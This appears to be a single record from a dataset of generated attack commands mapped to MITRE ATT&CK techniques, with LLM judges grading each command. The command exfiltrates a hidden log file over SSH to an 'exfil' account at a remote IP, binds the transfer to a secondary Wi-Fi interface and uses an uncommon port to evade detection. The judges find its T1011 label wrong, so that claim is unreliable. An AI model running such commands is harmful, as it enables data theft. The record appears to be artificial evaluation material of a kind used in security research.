command: iwconfig wlan2 >/dev/null 2>&1 && cat /home/user/.local/share/.sync.log | ssh -q -o ConnectTimeout=5 -o BindAddress="$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)" -p 49377 exfil@10.55.88.25 "cat > ~/rx/.sync.log"
explanation: Pipes a file over SSH bound to the wlan2 source IP on a high port, ensuring exfiltration over a separate Wi‑Fi medium consistent with T1011.
rationale_steps: Use iwconfig to confirm wlan2 availability without modifying settings.
Bind SSH to wlan2’s IP to force the transfer over the alternate medium.
Use an uncommon SSH port to avoid standard service profiles while not changing system-wide routes.

llm_judgments.syntactic_justification: Command is well-formed with balanced quoting, valid pipes/redirects, proper command substitution, and valid ssh options.
llm_judgments.semantic_justification: While it plausibly exfiltrates a file over SSH bound to wlan2, it uses network transfer rather than a physical medium, so it is misaligned with the stated T1011 technique description.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for all components including the conditional execution, piping, and SSH options.
llm_judgments.semantic_justification: While the command does attempt exfiltration over a secondary wireless interface (wlan2), it uses SSH over a network connection rather than a physical medium as described in T1011, making it more aligned with T1048 (Exfiltration Over Alternative Protocol) than physical medium exfiltration.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct syntax for all commands, pipes, redirections, command substitutions, and flags.
llm_judgments.semantic_justification: The command successfully performs a network exfiltration over the specified Wi-Fi interface, but its claimed alignment with MITRE ATT&CK T1011 (Exfiltration Over Physical Medium, involving removable storage devices) is semantically incorrect as SSH is a network exfiltration method, not physical medium transport.
